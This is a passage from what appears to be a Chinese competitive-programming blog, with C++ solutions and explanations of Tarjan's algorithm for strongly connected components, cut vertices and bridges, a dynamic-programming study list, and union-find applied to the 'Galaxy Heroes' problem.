<p>瑟瑟发抖的萌新好不容易A掉了这道14个人才过掉的题，然而被杨树神无情抢沙发，仅仅慢了十几分钟……已经哭晕在厕所……</p>
</blockquote>
<p>为什么要拉出来这道题呢，因为刚刚刷完割边割点强连通分量，所以就写写这道题试一试，而且发现了一些新的技巧，神奇的缩点和最后答案的判断……</p>
<h1 id="最受欢迎的牛"><a href="#最受欢迎的牛" class="headerlink" title="最受欢迎的牛"></a>最受欢迎的牛</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>每头牛都有一个梦想：成为一个群体中最受欢迎的名牛！在一个有N(1&lt;=N&lt;=10,000)头牛的牛群中，给你M(1&lt;=M&lt;=50,000)个二元组(A,B),表示A认为B是受欢迎的。既然受欢迎是可传递的，那么如果A认为B受欢迎，B又认为C受欢迎,则A也会认为C是受欢迎的，哪怕这不是十分明确的规定。你的任务是计算被所有其它的牛都喜欢的牛的个数。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行，两个数，N和M。第2～M+1行，每行两个数，A和B，表示A认为B是受欢迎的；</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>   一行，最受欢迎的奶牛的数量……</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题用到了tarjan算法，用这个算法来求出所有的联通分量，为什么要求联通分量呢，因为每一个连通分量中，因为我喜欢你，你也喜欢我，那么我们两个就可以看成一个点，这样就可以吧五万个点缩成不同的连通分量，大大减少运算。</p>
<p>然后缩成了连通分量之后，就可以把他们当成每一个点，如果图中有且仅有一个点的出度为零，那么这个点中的所有元素就都是万众仰慕的牛了！输出元素数量就好。</p>
<p>那么为什么有且仅有一个点的出度为零就确定了这个集合呢，因为如果出度如果没有一个为零，那么这个图就仅仅有一个点，点里面包含的所有点都是满足条件的点，所有的牛都喜欢对方（形成了环），如果有多个点出度为零，那么就没有集合是满足条件的了，因为如果多个点出度为零，那么一定有其中的一个点不喜欢其他牛，那么就没有办法找到所有牛都喜欢的牛了,因此我们只需要判断点的出度就可以了。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line">Edge a[<span class="number">50001</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,xx,yy,Link[<span class="number">10001</span>],len=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> low[<span class="number">50001</span>],dfn[<span class="number">50001</span>],ind=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stack</span>[<span class="number">50001</span>],top=<span class="number">0</span>,tot=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> all[<span class="number">50001</span>],bel[<span class="number">50001</span>];</span><br><span class="line"><span class="keyword">int</span> Out_point[<span class="number">50001</span>],ans;</span><br><span class="line"><span class="keyword">bool</span> ins[<span class="number">50001</span>],GG=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].x=xx;</span><br><span class="line">    a[len].y=yy;</span><br><span class="line">    a[len].next=Link[xx];</span><br><span class="line">    Link[xx]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    low[x]=dfn[x]=++ind;</span><br><span class="line">    <span class="built_in">stack</span>[++top]=x;</span><br><span class="line">    ins[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i!=<span class="number">0</span>;i=a[i].next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> y=a[i].y;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[y])</span><br><span class="line">        &#123;</span><br><span class="line">            tarjan(y);</span><br><span class="line">            low[x]=min(low[y],low[x]);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ins[y]==<span class="literal">true</span>)</span><br><span class="line">        low[x]=min(low[x],low[y]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(low[x]==dfn[x])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        tot++;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            all[tot]++;</span><br><span class="line">            k=<span class="built_in">stack</span>[top--];</span><br><span class="line">            ins[k]=<span class="literal">false</span>;</span><br><span class="line">            bel[k]=tot;</span><br><span class="line">        &#125;<span class="keyword">while</span>(k!=x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Link,<span class="number">0</span>,<span class="keyword">sizeof</span>(Link));</span><br><span class="line">    <span class="built_in">memset</span>(low,<span class="number">0</span>,<span class="keyword">sizeof</span>(low));</span><br><span class="line">    <span class="built_in">memset</span>(dfn,<span class="number">0</span>,<span class="keyword">sizeof</span>(dfn));</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">stack</span>,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="built_in">stack</span>));</span><br><span class="line">    <span class="built_in">memset</span>(ins,<span class="literal">false</span>,<span class="keyword">sizeof</span>(ins));</span><br><span class="line">    <span class="built_in">memset</span>(bel,<span class="number">0</span>,<span class="keyword">sizeof</span>(bel));</span><br><span class="line">    <span class="built_in">memset</span>(all,<span class="number">0</span>,<span class="keyword">sizeof</span>(all));</span><br><span class="line">    <span class="built_in">memset</span>(Out_point,<span class="number">0</span>,<span class="keyword">sizeof</span>(Out_point));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;xx&gt;&gt;yy;</span><br><span class="line">        init(xx,yy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!dfn[i]) tarjan(i);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(bel[a[i].x]==bel[a[i].y])</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(bel[a[i].x]!=bel[a[i].y])</span><br><span class="line">        &#123;</span><br><span class="line">           Out_point[bel[a[i].x]]++;</span><br><span class="line">           <span class="comment">//cout&lt;&lt;bel[a[i].x]&lt;&lt;&#x27; &#x27;&lt;&lt;a[i].x&lt;&lt;&#x27; &#x27;&lt;&lt;Out_point[bel[a[i].x]]++&lt;&lt;endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans=n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Out_point[i]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(GG==<span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                GG=<span class="literal">true</span>;</span><br><span class="line">                ans=all[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(GG==<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>tarjan</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划-任务表</title>
    <url>/2017/05/19/8c645d037669/</url>
    <content><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><blockquote>
<p>所以说这就是我未来好几个月要努力的东西了……</p>
</blockquote>
<p><del>1.动态规划入门</del></p>
<p><del>2.动态规划的基础和动机</del></p>
<p><del>3.资源分配类</del></p>
<p><del>4.背包问题</del></p>
<p><del>5.双进程类问题</del></p>
<p><del>6.区间动态规划</del></p>
<p><del>7.二维动态规划</del></p>
<p><del>8.动态规划深入讨论</del></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>动态规划书上的东西道是搞完了，但是还有很多比较高深的东西QAQ，以后慢慢学，希望在OI的路上越走越远</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>割点,割边与强连通分量</title>
    <url>/2017/05/19/299c01a5d828/</url>
    <content><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><blockquote>
<p>无良学姐瞎写讲稿，毁我青春，还好有刘神相助，改了错误的地方，不然要栽在书上了……首先说割点，割点的意义在于切掉这个点，就，就不连通了，这个图就毁了，那么这个点就是一个割点，所以说我们在求割点的时候，需要注意一种东西，那就是你搞得图，不一定是联通的，所以你需要遍历所有的联通图……<br><br>因为P1230就是这个坑，超级大坑，这个图是不连接的，所以你需要求出所有图的所有割点……</p>
</blockquote>
<h1 id="关于割点"><a href="#关于割点" class="headerlink" title="关于割点"></a>关于割点</h1><h2 id="割点概念："><a href="#割点概念：" class="headerlink" title="割点概念："></a>割点概念：</h2><blockquote>
<p>在一个无向连通图中，如果有一个顶点集合，删除这个顶点集合以及这个集合中所有顶点相关联的边以后，原图变成多个连通块，就称这个点集为割点集合。</p>
</blockquote>
<h2 id="求出割点"><a href="#求出割点" class="headerlink" title="求出割点"></a>求出割点</h2><p>然后说如何求出割点，首先我们需要建图，然后开两个数组，一个是dfn，另一个是low，而dfn表示的是DFS的访问时间，low表示的是这个点能回到的最靠前的点。我们建立一个DFS树，按照顺序DFS得到一个树，这个树来说，对于一个树，我们要看他的边，如果这个边是链接下面的点的话，他就是正常边，如果这个边链接上面的点，那么这就不是一个正常的边，我们称作为返祖边，对于返祖边我无话可说，一旦遇到这种返祖边，也就意味着这个返祖边（u，v），dfn[v]&lt;dfn[u] 我们就开始记录下除了父亲之外的所有点能访问到的最小dfn的值，所以说对于x的一个儿子y，如果low[y]&gt;=dfn[x] 那么就说明y中不存在想x的祖先的返祖边，并且这种访问是不可以访问父亲的……</p>
<p>比如下面这张图片：</p>
<p><img src="https://xorex.space/image/014.jpg"></p>
<p>ps：红边为返祖边……</p>
<p>然后直接DFS，每次枚举x到y的边。</p>
<p>1.如果y是x的父亲，就跳过（因为我们<strong>不访问父亲点</strong>）</p>
<p>2.如果y被访问，那么就是返祖边（因为之前已经访问到了，只能返祖边再次对他访问）</p>
<p>3.如果y没有被访问的话，就对y进行DFS，用low[y]来更新low[x]，并判断low[y]是否大于等于dfn[x]，如果是，那么字树+1。</p>
<p>注意，代码中实现是递归实现的，所以遍历到所有的点之后，然后逐次返回到上一个值，然后进行处理，所以说在判断这个子树有没有返祖边的时候，比较low[y]和dfn[x]是成立的。</p>
<p>最后来求出割点，如果为根节点，那么字树需要大于等于2，如果不是根节点，只需要大于等于1就可以了。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> par=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	dfn[x]=low[x]=++ind;</span><br><span class="line">	<span class="keyword">int</span> son=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=Line[x],y;i;i=a[i].next)</span><br><span class="line">	<span class="keyword">if</span>((y=a[i].point)!=par)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(!dfn[y])</span><br><span class="line">		&#123;</span><br><span class="line">			tarjan(y,x);</span><br><span class="line">			<span class="keyword">if</span>(low[y]&lt;low[x])</span><br><span class="line">			low[x]=low[y];</span><br><span class="line">			<span class="keyword">if</span>(low[y]&gt;=dfn[x])</span><br><span class="line">			son++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(dfn[y]&lt;low[x])</span><br><span class="line">		low[x]=dfn[y];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(son&gt;=<span class="number">2</span>||(son==<span class="number">1</span>&amp;&amp;par))</span><br><span class="line">	ans[++tot]=x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="割点判断"><a href="#割点判断" class="headerlink" title="割点判断"></a>割点判断</h2><p>然后呢，就是可爱的割边了！</p>
<p>说道割边，那么我们试问，割边的两个点是不是割点呢，两个割点所连接的边是否为割边？？？</p>
<p>然而都不是，都不是，具体原因可以参看下面的图片……</p>
<p><img src="https://xorex.space/image/015.jpg"></p>
<h1 id="关于割边"><a href="#关于割边" class="headerlink" title="关于割边"></a>关于割边</h1><h2 id="割边概念："><a href="#割边概念：" class="headerlink" title="割边概念："></a>割边概念：</h2><blockquote>
<p>假设有连通图G，e是其中一条边，如果G-e是不连通的，则边e是图G的一条割边。</p>
</blockquote>
<h2 id="割边判断："><a href="#割边判断：" class="headerlink" title="割边判断："></a>割边判断：</h2><p>有了割点作为基础，我们就可以搞割边了，首先返祖边绝对不会是割边的，因为去掉了返祖边对整个图是没有什么影响的，所以说我们找到没有返祖边，也就是说，如果不去访问父节点，那么无法到比自己还要靠前的边，这个就是一个割边……</p>
<p>和割点一样，我们不断更新他的dfn和low的值，然后最后进行比较，值得一提的是你需要提前来建立一个数组，暂且叫他rev，其中rev[i]表示的是 i 这个编号中，他的反向边的编号，这个是用来判断下一次访问是否是父节点，如果反向边的编号等于了下次访问的边的编号，那么就GG了，这是访问父节点……</p>
<p>然后我们判断割边的条件就是，如果这个点不是根节点，并且这个点在不访问父节点的情况下，最前面能到达的点就是自己的话，那么它到它父亲这条边就是一个割边。</p>
<p><img src="https://xorex.space/image/016.jpg"></p>
<p>上面的图要配合着第一张图来看，其中点后面的数字表示最早访问点……</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cut_Edge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> par=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[x]=low[x]=++ind;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Line[x];i!=<span class="number">0</span>;i=a[i].next)</span><br><span class="line">    <span class="keyword">if</span>(i!=par)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> y=a[i].y;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[y])</span><br><span class="line">        &#123;</span><br><span class="line">            Cut_Edge(y,rev[i]);<span class="comment">//rev代表的是其反向边；</span></span><br><span class="line">            low[x]=min(low[x],low[y]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> low[x]=min(low[x],dfn[y]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dfn[x]==low[x]&amp;&amp;par!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[++top].x=min(a[par].x,a[par].y);</span><br><span class="line">        ans[top].y=max(a[par].x,a[par].y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="关于强连通分量"><a href="#关于强连通分量" class="headerlink" title="关于强连通分量"></a>关于强连通分量</h1><h2 id="强连通分量："><a href="#强连通分量：" class="headerlink" title="强连通分量："></a>强连通分量：</h2><blockquote>
<p>有向图强连通分量：在有向图G中，如果两个顶点vi,vj间（vi&gt;vj）有一条从vi到vj的有向路径，同时还有一条从vj到vi的有向路径，则称两个顶点强连通(strongly connected)。如果有向图G的每两个顶点都强连通，称G是一个强连通图。有向图的极大强连通子图，称为强连通分量(strongly connected components)。</p>
</blockquote>
<h2 id="强连通分量求法："><a href="#强连通分量求法：" class="headerlink" title="强连通分量求法："></a>强连通分量求法：</h2><p>然后就是强联通分量……</p>
<p>说到强连通分量这种东西啊，真的是非常神奇呢，</p>
<p>首先说一下强连通分量的定义啊，强连通分量集合中，每两个元素之间，都有一条有向边可以互相到达的集合叫做强连通分量集合，比如下图：</p>
<p><img src="https://xorex.space/image/017.jpg"></p>
<p>这张图片中，所有的强连通分量有：{1,2,3,4}，{5}，{6}；这三个，比如第一个集合中，1到4可以通过3来到达，3到1有一条直接相连的边，这样就保证了在集合{1,2,3,4}中，每个元素之间，都有一条有向边可以互相到达……</p>
<p>在求强连通分量的时候，我们需要用到一个叫做栈的东西，和以往一样的，我们需要建立一个dfn和low两个值，然后不停地在DFS过程中记录下来最早值和访问时间，如果没有被访问，那么就去访问他，然后压到栈里面，如果没有被访问，就更新low的值，并且判断dfn是否等于low，如果相等，那么这个x在弹栈前面（包括自己）所有的点都能构成一个联通分量。</p>
<p>至于为什么，因为在这个栈里面，自己前面所有的点都是自己遍历过的，那么如果自己前面的点都能够回到自己这里，那么当到达这个x点的时候，如果x不能回到之前的点，那么这个联通分量最大也就是这么大了，因为这是联通的极限了，所有如果low==dfn的话，表明自己不能在往前走了，而自己<strong>后面的点都是和自己联通</strong>的，那么，自己就是这个连通分量的最终地方，也就是说，在这个栈里面，自己之前的所有点包括自己都是一个连通分量，<strong>当且仅当low[u]==dfn[u]时，u以及在u之后被加入栈的点构成一个强连通分量，而这些点将会在u的DFS结束时被从栈中弹出。</strong></p>
<p>1.若y未被访问过，递归访问y之后用low[y]更新low[x]。</p>
<p>2.若y被访问过且y在栈中，那么用dfn[y]更新low[x]。</p>
<p>3.在递归结束如果dfn[x]==low[x]，将x及之后的点弹出栈，标记它们属于同一个强连通分量。</p>
<p>上面就是找联通分量的一个过程了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[x]=low[x]=++ind;</span><br><span class="line">    <span class="built_in">stack</span>[++top]=x;</span><br><span class="line">    ins[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Line[x];i!=<span class="number">0</span>;i=a[i].next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> y=a[i].y;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[y])</span><br><span class="line">        &#123;</span><br><span class="line">            tarjan(y);</span><br><span class="line">            low[x]=min(low[x],low[y]);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ins[y]==<span class="literal">true</span>)</span><br><span class="line">        low[x]=min(low[x],dfn[y]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dfn[x]==low[x])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k,The_tall=<span class="number">0</span>;</span><br><span class="line">        tot++;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            The_tall++;</span><br><span class="line">            k=<span class="built_in">stack</span>[top--];</span><br><span class="line">            ins[k]=<span class="literal">false</span>;</span><br><span class="line">            bel[tot]++;</span><br><span class="line">            ans[tot][bel[tot]]=k;</span><br><span class="line">        &#125;<span class="keyword">while</span>(k!=x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>割边，割点和强连通分量就告一段落了，真是搞了好久……是时候看DP了！</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>tarjan</tag>
      </tags>
  </entry>
  <entry>
    <title>并查集+P1698银河英雄传+关押罪犯</title>
    <url>/2017/05/19/8ad52b3ab7a8/</url>
    <content><![CDATA[<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><blockquote>
<p>首先我要对最近写的题进行一下，反思，首先最近做P1698和P1225这两道题的时候，Debug的时间太长了，消耗我不少时间。所以我觉得是我的做题方式出了问题，我应该在拿到一道题之后，去认真的想，然后思考，大致规划出怎么写，代码实现思路需要详细一些，然后去仔细理解，明白每一个步骤是干什么后，想一想会不会出什么bug，或者特别情况，所有的东西都想清楚了之后，再去认真的把它敲出来，一边敲一边打表Debug，确保自己写的每一步都是对的才行。</p>
</blockquote>
<h1 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h1><p>并查集我也是刚刚学会的，所以总结一下。</p>
<p>并查集就是利用father数组来记录下来和每一个点联系的点，然后经过压缩路径之后，所有有关系的点都会指向同一个点，那么这就是一个集合，并查集来寻找两个点是否在同一个集合里面是非常快的。</p>
<h1 id="并查集代码"><a href="#并查集代码" class="headerlink" title="并查集代码"></a>并查集代码</h1><h2 id="递归版本："><a href="#递归版本：" class="headerlink" title="递归版本："></a>递归版本：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Getfather</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(father[x]==x) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">int</span> p=Getfather(father[x]);</span><br><span class="line">    Num_Start[x]+=Num_Start[father[x]];</span><br><span class="line">    father[x]=p;</span><br><span class="line">    <span class="keyword">return</span> father[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="非递归版本："><a href="#非递归版本：" class="headerlink" title="非递归版本："></a>非递归版本：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Getfather</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Find=k;</span><br><span class="line">    <span class="keyword">while</span>(parent[Find]!=Find)</span><br><span class="line">    Find=parent[Find];</span><br><span class="line">    <span class="keyword">while</span>(Find!=k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x=parent[k];</span><br><span class="line">        parent[k]=Find;</span><br><span class="line">        k=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Find;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="银河英雄传"><a href="#银河英雄传" class="headerlink" title="银河英雄传"></a>银河英雄传</h1><h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><blockquote>
<p>公元五八○一年，地球居民迁移至金牛座α第二行星，在那里发表银河联邦创立宣言，同年改元为宇宙历元年，并开始向银河系深处拓展。<br><br>宇宙历七九九年，银河系的两大军事集团在巴米利恩星域爆发战争。泰山压顶集团派宇宙舰队司令莱因哈特率领十万余艘战舰出征，气吞山河集团点名将杨威利组织麾下三万艘战舰迎敌。<br><br>杨威利擅长排兵布阵，巧妙运用各种战术屡次以少胜多，难免恣生骄气。在这次决战中，他将巴米利恩星域战场划分成30000列，每列依次编号为1, 2, …, 30000。之后，他把自己的战舰也依次编号为1, 2, …, 30000，让第i号战舰处于第i列(i = 1, 2, …, 30000)，形成“一字长蛇阵”，诱敌深入。这是初始阵形。当进犯之敌到达时，杨威利会多次发布合并指令，将大部分战舰集中在某几列上，实施密集攻击。合并指令为M i j，含义为让第i号战舰所在的整个战舰队列，作为一个整体（头在前尾在后）接至第j号战舰所在的战舰队列的尾部。显然战舰队列是由处于同一列的一个或多个战舰组成的。合并指令的执行结果会使队列增大。<br><br>然而，老谋深算的莱因哈特早已在战略上取得了主动。在交战中，他可以通过庞大的情报网络随时监听杨威利的舰队调动指令。<br><br>在杨威利发布指令调动舰队的同时，莱因哈特为了及时了解当前杨威利的战舰分布情况，也会发出一些询问指令：C i j。<br><br>该指令意思是，询问电脑，杨威利的第i号战舰与第j号战舰当前是否在同一列中，如果在同一列中，那么它们之间布置有多少战舰。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行有一个整数T（1&lt;=T&lt;=500,000），表示总共有T条指令。以下有T行，每行有一条指令。指令有两种格式：<br></p>
</blockquote>
<ol>
<li>   M  i  j  ：i和j是两个整数（1&lt;=i , j&lt;=30000），表示指令涉及的战舰编号。该指令是莱因哈特窃听到的杨威利发布的舰队调动指令，并且保证第i号战舰与第j号战舰不在同一列。</li>
<li>   C  i  j  ：i和j是两个整数（1&lt;=i , j&lt;=30000），表示指令涉及的战舰编号。该指令是莱因哈特发布的询问指令。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>如果是莱因哈特发布的询问指令，你的程序要输出一行，仅包含一个整数，表示在同一列上，第i号战舰与第j号战舰之间布置的战舰数目。如果第i号战舰与第j号战舰当前不在同一列上，则输出-1。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题核心就是并查集查询和两个数组depth和conut的处理比较麻烦。我们在计算两个战舰之间的战舰数量的时候需要不断的更新depth和conut，具体方法可以上网上搜索，这道题我之所以卡住的根本原因就是我没有理解算法就开始去敲了，其中搜索Getfather中的时候，更新depth需要根据根节点开始逐步进行跟新，这样确保每次更新的都为正确值，然后这样的话Getfather就需要用递归来写，每次回到上一个父亲节点，但是如果使用非递归版本之后，就没有办法根据根节点更新……尽管有可能爆栈……</p>
<p>所以换是各种算法都要学，然后根据题目的意义进行搞，希望能从今天长达4个小时的纯Debug时间得到教训！</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a,b,This,father[<span class="number">30001</span>],Num_end[<span class="number">30001</span>],Num_Start[<span class="number">30001</span>];</span><br><span class="line"><span class="keyword">char</span> s1;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Getfather</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(father[x]==x) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">int</span> p=Getfather(father[x]);</span><br><span class="line">    Num_Start[x]+=Num_Start[father[x]];</span><br><span class="line">    father[x]=p;</span><br><span class="line">    <span class="keyword">return</span> father[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span 